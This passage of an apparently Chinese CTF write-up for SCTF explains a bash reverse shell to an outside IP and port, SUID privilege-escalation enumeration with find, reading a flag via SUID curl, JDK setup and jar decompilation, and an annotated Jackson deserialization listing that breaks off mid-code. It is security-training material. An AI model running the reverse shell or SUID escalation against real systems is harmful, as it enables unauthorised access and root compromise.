src=\"/../SCTF/30.png\" alt=\"image.png\"></p>\n<ul>\n<li>反弹成功，但是查看flag，发现没有权限，需要提权</li>\n</ul>\n<p><img src=\"/../SCTF/31.png\" alt=\"image.png\"></p>\n<p><strong>关于反弹shell</strong></p>\n<ul>\n<li>上面的命令是</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-c</span> <span class=\"token punctuation\">\\</span>\"bash <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/124.222.155.242/7777 <span class=\"token operator\">&lt;</span><span class=\"token file-descriptor important\">&amp;2</span><span class=\"token punctuation\">\\</span>\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>-c 选项表示将后面的参数作为一个命令来执行</li>\n<li>-i相当于会启动一个交互式的bash shell</li>\n<li>所以要先bash -c 再bash -i</li>\n</ul>\n<p><strong>命令的含义</strong><br /><a href=\"https://xz.aliyun.com/t/2549\">Linux 反弹shell（二）反弹shell的本质 - 先知社区</a></p>\n<ul>\n<li><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>&amp;表示把标准输出和标准错误输出 都输出到vps上，也就是1和2 都指向vps</p></blockquote>\n</li>\n<li><p>后面的 &lt;&amp;2 相当于 0&lt;&amp;2，表示把标准输入指针到标准错误输出，也就是0也指向2，0指向1也行</p>\n</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1688561711132-2d0f6154-eb58-466a-8292-6eafb47d7ae0.jpeg#averageHue=%23b0afab&clientId=ued9b4798-8f69-4&from=paste&height=588&id=udcbae88c&originHeight=1920&originWidth=1080&originalType=binary&ratio=1.25&rotation=90&showTitle=false&size=755838&status=done&style=none&taskId=u3c1ad190-1efc-4737-af92-d1c76e47456&title=&width=331\" alt=\"f7b1da3dd7e25fc07e4939316fb3f28.jpg\"><br /><img src=\"/../SCTF/32.png\" alt=\"image.png\"></p>\n<p><img src=\"/../SCTF/33.png\" alt=\"image.png\"></p>\n<ul>\n<li>首先</li>\n</ul>\n<h2 id=\"suid-提权-curl\"><a href=\"#suid-提权-curl\" class=\"headerlink\" title=\"suid 提权 curl\"></a>suid 提权 curl</h2><p><a href=\"https://cloud.tencent.com/developer/article/2190458\">权限提升 | suid提权及修复方式-腾讯云开发者社区-腾讯云</a></p>\n<p>通常Linux系统文件及目录最常见的三种权限为：可读权限(r)，可写权限(w)和可执行权限(x)。<br />有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如&#x2F;usr&#x2F;bin&#x2F;passwd文件的权限状态：“-rwsr-xr-x.”，<br />此时就被称为Set UID，简称为SUID权限。<br /><strong>当一个可执行文件被设置了 s 权限时，在执行该程序时，它将会以该程序的所有者或所属组的身份运行。</strong></p>\n<ul>\n<li>也就是如果我找到了一个有SUID权限且属主为root的，我就能用root的权限执行</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-user</span> root <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-4000</span> <span class=\"token parameter variable\">-print</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n<span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token parameter variable\">-type</span> f <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n<span class=\"token function\">find</span> / <span class=\"token parameter variable\">-user</span> root <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-4000</span> <span class=\"token parameter variable\">-exec</span> <span class=\"token function\">ls</span> <span class=\"token parameter variable\">-ldb</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">;</span>\n\n<span class=\"token parameter variable\">-perm</span> 表示搜索随后的权限\n<span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s 表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n<span class=\"token number\">2</span> 表示该进程的第二个文件描述符，即stderr（标准错误）\n<span class=\"token operator\">></span> 表示重定向\n/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/../SCTF/34.png\" alt=\"image.png\"></p>\n<ul>\n<li>发现有<code>curl</code>，直接<code>curl file:///flag</code></li>\n</ul>\n<p><img src=\"/../SCTF/35.png\" alt=\"image.png\"></p>\n<h1 id=\"SCTF-hellojava\"><a href=\"#SCTF-hellojava\" class=\"headerlink\" title=\"SCTF hellojava\"></a>SCTF hellojava</h1><h2 id=\"java8、java11环境配置\"><a href=\"#java8、java11环境配置\" class=\"headerlink\" title=\"java8、java11环境配置\"></a>java8、java11环境配置</h2><p><a href=\"https://blog.csdn.net/weixin_43585249/article/details/120680722?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4-120680722-blog-123898804.235%5Ev38%5Epc_relevant_anti_vip&spm=1001.2101.3001.4242.3&utm_relevant_index=7\">JDK 8 和JDK11双环境配置_别卷了球球了的博客-CSDN博客</a></p>\n<ul>\n<li>先安装jdk11，再安装jdk8(但是我觉得这个顺序不重要，只要把下面的文件删了就行)</li>\n</ul>\n<p><img src=\"/../SCTF/36.png\" alt=\"image.png\"></p>\n<ul>\n<li>要把这个文件夹里面存在的文件都删掉(java.exe)啥的，不让cmd打开的优先级比我自己设置的优先级高</li>\n<li>配置环境变量</li>\n</ul>\n<p><img src=\"/../SCTF/37.png\" alt=\"image.png\"></p>\n<ul>\n<li>把<code>D:\\jdk-11\\bin</code>目录下的<code>java.exe</code>改成<code>java11.exe</code></li>\n<li>此时输入<code>java -version</code>，系统默认是<code>jdk1.8</code>，输入<code>java11 -version</code>是java11</li>\n</ul>\n<p><img src=\"/../SCTF/38.png\" alt=\"image.png\"></p>\n<h2 id=\"jar包反编译\"><a href=\"#jar包反编译\" class=\"headerlink\" title=\"jar包反编译\"></a>jar包反编译</h2><ul>\n<li>给个jar包，用idea的插件<code>java decompiler</code>反编译</li>\n<li>在jar包所在的文件夹，打开<code>cmd</code></li>\n</ul>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">java <span class=\"token operator\">-</span>cp <span class=\"token string\">\"D:\\idea\\IntelliJ IDEA 2021.1.3\\plugins\\java-decompiler\\lib\\java-decompiler.jar\"</span> <span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>jetbrains<span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>decompiler<span class=\"token punctuation\">.</span>main<span class=\"token punctuation\">.</span>decompiler<span class=\"token punctuation\">.</span></span>ConsoleDecompiler</span> <span class=\"token operator\">-</span>dgs<span class=\"token operator\">=</span><span class=\"token boolean\">true</span> sctf<span class=\"token punctuation\">.</span>jar test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>中间双引号的是插件路径(换成自己的)，true后面第一个参数是<code>jar</code>包的名字,第二个参数是反编译后文件存放的位置，这里要新建一个<code>test</code>文件夹</li>\n<li>反编译成功之后，还是一个jar包，用jar命令解压</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">jar <span class=\"token parameter variable\">-xvf</span> sctf.jar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/../SCTF/39.png\" alt=\"image.png\"></p>\n<ul>\n<li>函数的作用是循环处理键</li>\n</ul>\n<h2 id=\"整个代码的含义\"><a href=\"#整个代码的含义\" class=\"headerlink\" title=\"整个代码的含义\"></a>整个代码的含义</h2><details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">_deserializeUsingPropertyBased</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">JsonParser</span> p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">DeserializationContext</span> ctxt<span class=\"token punctuation\">)</span>\n       <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span>\n   <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">final</span> <span class=\"token class-name\">PropertyBasedCreator</span> creator <span class=\"token operator\">=</span> _propertyBasedCreator<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//这里获取标注@JsonCreator的构造函数</span>\n       <span class=\"token class-name\">PropertyValueBuffer</span> buffer <span class=\"token operator\">=</span> creator<span class=\"token punctuation\">.</span><span class=\"token function\">startBuilding</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> _objectIdReader<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token class-name\">TokenBuffer</span> unknown <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> activeView <span class=\"token operator\">=</span> _needViewProcesing <span class=\"token operator\">?</span> ctxt<span class=\"token punctuation\">.</span><span class=\"token function\">getActiveView</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n\n       <span class=\"token class-name\">JsonToken</span> t <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">currentToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//currentToken() 方法的作用是返回当前解析器所读取的 JSON 标记</span>\n       <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">BeanReferring</span><span class=\"token punctuation\">></span></span> referrings <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> t <span class=\"token operator\">==</span> <span class=\"token class-name\">JsonToken</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FIELD_NAME</span><span class=\"token punctuation\">;</span> t <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">nextToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token class-name\">String</span> propName <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">currentName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           p<span class=\"token punctuation\">.</span><span class=\"token function\">nextToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// to point to value</span>\n           <span class=\"token keyword\">final</span> <span class=\"token class-name\">SettableBeanProperty</span> creatorProp <span class=\"token operator\">=</span> creator<span class=\"token punctuation\">.</span><span class=\"token function\">findCreatorProperty</span><span class=\"token punctuation\">(</span>propName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token comment\">/* \n           反序列化 JSON 字符串时，\n           Jackson 会使用 SettableBeanProperty 对象来访问和设置 Java 对象的属性\n           这行代码用于查找 PropertyBasedCreator 对象中是否存在与当前 JSON 字段名字 propName \n           匹配的 SettableBeanProperty 属性\n           也就是找类中有没有映射的属性\n           */</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">.</span><span class=\"token function\">readIdProperty</span><span class=\"token punctuation\">(</span>propName<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> creatorProp <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// creator property?</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>creatorProp <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token comment\">// Last creator property to set?</span>\n               <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">;</span>\n               <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>activeView <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>creatorProp<span class=\"token punctuation\">.</span><span class=\"token function\">visibleInView</span><span class=\"token punctuation\">(</span>activeView<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                   p<span class=\"token punctuation\">.</span><span class=\"token function\">skipChildren</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n               value <span class=\"token operator\">=</span> <span class=\"token function\">_deserializeWithErrorWrapping</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> creatorProp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token comment\">//对属性值反序列化</span>\n               <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">.</span><span class=\"token function\">assignParameter</span><span class=\"token punctuation\">(</span>creatorProp<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                   p<span class=\"token punctuation\">.</span><span class=\"token function\">nextToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// to move to following FIELD_NAME/END_OBJECT</span>\n                   <span class=\"token class-name\">Object</span> bean<span class=\"token punctuation\">;</span>\n                   <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                       bean <span class=\"token operator\">=</span> creator<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                       bean <span class=\"token operator\">=</span> <span class=\"token function\">wrapInstantiationProblem</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span>\n                   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bean <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                       <span class=\"token keyword\">return</span> ctxt<span class=\"token punctuation\">.</span><span class=\"token function\">handleInstantiationProblem</span><span class=\"token punctuation\">(</span><span class=\"token function\">handledType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                               <span class=\"token function\">_creatorReturnedNullException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span>\n                   <span class=\"token comment\">// [databind#631]: Assign current value, to be accessible by custom serializers</span>\n                   p<span class=\"token punctuation\">.</span><span class=\"token function\">setCurrentValue</span><span class=\"token punctuation\">(</span>bean<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                   <span class=\"token comment\">//  polymorphic?</span>\n                   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bean<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> _beanType<span class=\"token punctuation\">.</span><span class=\"token function\">getRawClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                       <span class=\"token keyword\">return</span> <span class=\"token function\">handlePolymorphic</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">,</span> unknown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span>\n                   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>unknown <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// nope, just extra unknown stuff...</span>\n                       bean <span class=\"token operator\">=</span> <span class=\"token function\">handleUnknownProperties</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">,</span> unknown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span>\n                   <span class=\"token comment\">// or just clean?</span>\n                   <span class=\"token keyword\">return</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// regular property? needs buffering</span>\n           <span class=\"token class-name\">SettableBeanProperty</span> prop <span class=\"token operator\">=</span> _beanProperties<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>propName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>prop <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                   buffer<span class=\"token punctuation\">.</span><span class=\"token function\">bufferProperty</span><span class=\"token punctuation\">(</span>prop<span class=\"token punctuation\">,</span> <span class=\"token function\">_deserializeWithErrorWrapping</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> prop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnresolvedForwardReference</span> reference<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                   <span class=\"token comment\">// 14-Jun-2016, tatu: As per [databind#1261], looks like we need additional</span>\n                   <span class=\"token comment\">//    handling of forward references here. Not exactly sure why existing</span>\n                   <span class=\"token comment\">//    facilities did not cover, but this does appear to solve the problem</span>\n                   <span class=\"token class-name\">BeanReferring</span> referring <span class=\"token operator\">=</span> <span class=\"token function\">handleUnresolvedReference</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span>\n                           prop<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> reference<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>referrings <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                       referrings <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">BeanReferring</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token punctuation\">&#125;</span>\n                   referrings<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>referring<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// Things marked as ignorable should not be passed to any setter</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IgnorePropertiesUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">shouldIgnore</span><span class=\"token punctuation\">(</span>propName<span class=\"token punctuation\">,</span> _ignorableProps<span class=\"token punctuation\">,</span> _includableProps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token function\">handleIgnoredProperty</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> <span class=\"token function\">handledType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> propName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// \"any property\"?</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_anySetter <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                   buffer<span class=\"token punctuation\">.</span><span class=\"token function\">bufferAnyProperty</span><span class=\"token punctuation\">(</span>_anySetter<span class=\"token punctuation\">,</span> propName<span class=\"token punctuation\">,</span> _anySetter<span class=\"token punctuation\">.</span><span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                   <span class=\"token function\">wrapAndThrow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> _beanType<span class=\"token punctuation\">.</span><span class=\"token function\">getRawClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> propName<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n\n           <span class=\"token comment\">// 29-Mar-2021, tatu: [databind#3082] May skip collection if we know</span>\n           <span class=\"token comment\">//    they'd just get ignored (note: any-setter handled above; unwrapped</span>\n           <span class=\"token comment\">//    properties also separately handled)</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_ignoreAllUnknown<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token comment\">// 22-Aug-2021, tatu: [databind#3252] must ensure we do skip the whole value</span>\n               p<span class=\"token punctuation\">.</span><span class=\"token function\">skipChildren</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// Ok then, let's collect the whole field; name and value</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>unknown <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n               unknown <span class=\"token operator\">=</span> ctxt<span class=\"token punctuation\">.</span><span class=\"token function\">bufferForInputBuffering</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           unknown<span class=\"token punctuation\">.</span><span class=\"token function\">writeFieldName</span><span class=\"token punctuation\">(</span>propName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           unknown<span class=\"token punctuation\">.</span><span class=\"token function\">copyCurrentStructure</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span>\n\n       <span class=\"token comment\">// We hit END_OBJECT, so:</span>\n       <span class=\"token class-name\">Object</span> bean<span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n           bean <span class=\"token operator\">=</span> creator<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token function\">wrapInstantiationProblem</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           bean <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// never gets here</span>\n       <span class=\"token punctuation\">&#125;</span>\n       <span class=\"token comment\">// 13-Apr-2020, tatu: [databind#2678] need to handle injection here</span>\n       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_injectables <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token function\">injectValues</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span>\n\n       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>referrings <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token 